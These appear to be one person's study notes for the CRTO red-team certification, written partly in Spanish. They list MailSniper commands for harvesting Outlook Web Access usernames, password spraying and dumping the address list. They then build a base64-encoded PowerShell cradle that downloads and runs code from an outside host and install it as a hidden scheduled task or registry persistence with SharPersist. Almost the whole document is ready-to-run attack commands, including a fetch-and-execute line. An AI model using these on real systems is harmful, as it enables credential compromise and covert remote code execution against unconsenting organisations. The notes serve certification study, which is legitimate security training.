# CRTO
Mi own notes to pass the CRTO

# Password Spraying

## Mail Sniper

Import the Module

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Check the valid usernames

```
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.local -Domain domain.local -UserList possible_users.txt -OutFile valid.txt
```

Password Spraying

```
Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Password
```

Dump all email accounts

```
Get-GlobalAddressList -ExchHostname mail.domain.local -UserName domain.local\user -Password Password -OutFile users.txt
```

# Host Persistence con SharPersist

## Task Scheduler

Encodear el payload

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```
```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
Configuration of the Host Persistence
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "Nombre_de_la_tarea" -m add -o [hourly | daily | logon]
```
